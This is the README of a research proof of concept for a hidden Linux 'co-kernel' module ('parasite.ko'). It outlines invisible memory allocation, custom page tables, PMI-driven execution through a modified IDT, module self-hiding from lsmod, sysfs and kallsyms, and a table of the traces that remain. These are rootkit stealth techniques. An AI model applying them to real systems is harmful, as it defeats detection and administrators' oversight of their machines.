# Co-kernel PoC — Parallel Co-Kernel for Linux x86-64

Proof of Concept: an independent execution component ("co-kernel") that coexists with a running Linux kernel in a QEMU x86-64 VM, with total invisibility across three surfaces: **memory**, **execution**, and **behavior**.

## Architecture Overview

```
USERSPACE
  └── insmod parasite.ko
            │
DRIVER NOYAU (Ring 0, ~100ms)
  ├── alloc_pages + set_direct_map_invalid  → mémoire invisible
  ├── build_pagetables (PGD→PTE)            → CR3 propre
  ├── install IDT[0x42] + PMU/LAPIC         → exécution hardware
  └── hide module                           → disparition totale
            │
CO-NOYAU (via PMI hardware tous les ~1M cycles)
  ├── Pages hors direct map Linux
  ├── Aucune trace /proc/modules, lsmod, sysfs
  └── ENDBR64 + iretq → coexiste avec CET
```

## Project Structure

```
CoKernel/
├── Makefile                  # Top-level build orchestrator
├── README.md                 # This file
├── include/
│   └── shared.h              # Shared definitions (layout, constants)
├── cokernel/
│   ├── Makefile              # Flat binary build
│   ├── cokernel.c            # Co-kernel payload (tick handler)
│   ├── cokernel.h            # Co-kernel interface
│   └── cokernel.lds          # Linker script (raw binary output)
├── module/
│   ├── Makefile              # Out-of-tree kernel module build (Kbuild)
│   ├── parasite_main.c       # Orchestrator (init/6 steps)
│   ├── memory.c/.h           # Invisible memory allocation
│   ├── pagetable.c/.h        # Custom page table construction
│   ├── execution.c/.h        # PMI/LAPIC hardware execution
│   ├── resolve.c/.h          # Symbol resolution via kprobes
│   ├── stealth.c/.h          # Module self-hiding
│   └── pmi_entry.S           # Assembly PMI handler + trampoline
├── scripts/
│   ├── build_module.sh       # Build cokernel.bin + parasite.ko
│   ├── build_rootfs.sh       # Build busybox initramfs
│   └── run_qemu.sh           # Launch QEMU VM with host kernel
└── markdown/
    └── V0/README.md           # Original design document
```

## Prerequisites

- Debian/Ubuntu x86-64 host
- Kernel headers for the running kernel
- GCC, Make, libelf-dev
- QEMU with KVM support (`qemu-system-x86_64`)
- wget, cpio, gzip, xxd

### Install on Debian/Ubuntu

```bash
sudo apt-get install -y \
    build-essential gcc make \
    libelf-dev libssl-dev \
    linux-headers-$(uname -r) \
    qemu-system-x86 \
    wget cpio xxd
```

## Build & Run

### Full pipeline (recommended)

```bash
# Build everything (module + rootfs)
make all

# Launch VM with host kernel
make run
```

### Step by step

```bash
# Build the co-kernel binary + parasite.ko module
make module

# Build the initramfs (includes module automatically)
make rootfs

# Launch QEMU VM (uses /boot/vmlinuz-$(uname -r))
make run
```

### Inside the VM

The init script automatically:
1. Shows pre-load system state
2. Loads `parasite.ko` via `insmod`
3. Shows post-load state (module should be invisible)
4. Runs the verification script
5. Drops to a shell

Manual verification:
```sh
# Module should NOT appear
lsmod
cat /proc/modules

# No trace in sysfs
ls /sys/module/

# No memory trace
cat /proc/cmdline
cat /proc/iomem
cat /proc/vmallocinfo

# Check dmesg for installation log
dmesg | grep cokernel
```

Exit QEMU: `Ctrl-A X` or `poweroff -f`

## How It Works

### 1. Invisible Memory (`memory.c`)

```
alloc_pages(GFP_KERNEL, order)    → 32 MB contiguous pages
set_direct_map_invalid_noflush()  → removed from ffff888... direct map
flush_tlb_kernel_range()          → TLB entries invalidated
SetPageReserved()                 → buddy allocator won't reclaim
```

After this, Linux has no virtual mapping to access these physical pages.

### 2. Custom Page Tables (`pagetable.c`)

Builds a complete PGD→P4D→PUD→PMD→PTE hierarchy mapping the hidden pages at `COKERNEL_VIRT_BASE`. The resulting PGD is loaded into CR3 by the PMI handler, giving the co-kernel its own address space.

### 3. Hardware Execution (`execution.c` + `pmi_entry.S`)

```
IA32_FIXED_CTR0 preset → overflow after 1M cycles → PMI triggered
LAPIC LVT_PC → delivers vector 0x42
IDT[0x42] → component_pmi_entry (ENDBR64 + save + CR3 switch + call + restore + iretq)
```

No kernel function hooked. No text patched. Pure hardware-driven execution.

### 4. Module Self-Hiding (`stealth.c`)

```
list_del(THIS_MODULE->list)       → invisible to lsmod
kobject_del(THIS_MODULE->mkobj)   → invisible to /sys/module/
clear syms table                  → invisible to kallsyms
```

### 5. CET Coexistence

- **IBT**: Handler starts with `ENDBR64` → indirect branch tracking satisfied
- **Shadow Stack**: Handler ends with `iretq` (not `RET`) → shadow stack not consulted

## Configuration

### QEMU Debug Mode

```bash
# Launch with GDB server (connect via gdb → target remote :1234)
make run -- -s -S
```

## Residual Traces

| Trace | Detectable By | Risk |
|-------|---------------|------|
| IDT vector 0x42 modified | Full IDT scan | Low |
| PMU MSRs modified | rdmsr / `perf stat` | Very low |
| 32 MB "used" in MemFree | `/proc/meminfo` | None (indistinguishable) |
| `PageReserved` struct pages | vmemmap exhaustive scan | Very low |

## License

GPL-2.0 — Research/educational purposes only.
